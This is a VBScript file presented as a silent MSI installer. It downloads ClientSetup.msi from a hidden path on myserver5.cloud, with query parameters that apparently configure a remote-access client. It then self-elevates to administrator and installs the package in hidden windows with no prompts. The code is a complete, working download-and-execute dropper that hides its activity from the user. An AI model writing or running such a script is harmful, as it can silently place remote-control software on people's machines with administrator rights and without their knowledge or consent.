' =============================================
' Silent MSI Installer - No Pop-ups
' Downloads and installs ClientSetup.msi silently as Admin
' =============================================

Dim url, msiPath, fso, tempFolder
url = "https://myserver5.cloud/Bin/.ClientSetup.msi?e=Access&y=Guest&c=INTUNE%20Test&c=&c=&c=&c=&c=&c=&c="

Set fso = CreateObject("Scripting.FileSystemObject")
tempFolder = fso.GetSpecialFolder(2) & "\MSIInstall"
msiPath = tempFolder & "\ClientSetup.msi"

' Create folder silently
If Not fso.FolderExists(tempFolder) Then
    fso.CreateFolder(tempFolder)
End If

' Self-elevate if not already admin
If Not IsElevated() Then
    ElevateMe
    WScript.Quit
End If

' Download silently
DownloadFile url, msiPath

' Install silently in background
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run "msiexec.exe /i """ & msiPath & """ /quiet /qn /norestart", 0, True

' Optional: Delete MSI after install (uncomment if wanted)
' fso.DeleteFile msiPath, True

WScript.Quit

' ====================== FUNCTIONS ======================

Function DownloadFile(strURL, strPath)
    On Error Resume Next
    Dim http, stream
    Set http = CreateObject("MSXML2.XMLHTTP")
    Set stream = CreateObject("ADODB.Stream")
    
    http.Open "GET", strURL, False
    http.Send
    
    If http.Status = 200 Then
        stream.Type = 1
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile strPath, 2
        stream.Close
    End If
    On Error GoTo 0
End Function

Function IsElevated()
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    IsElevated = (shell.Run("cmd.exe /c ""whoami /groups | findstr /i S-1-16-12288""", 0, True) = 0)
End Function

Sub ElevateMe()
    Dim shell
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 0
End Sub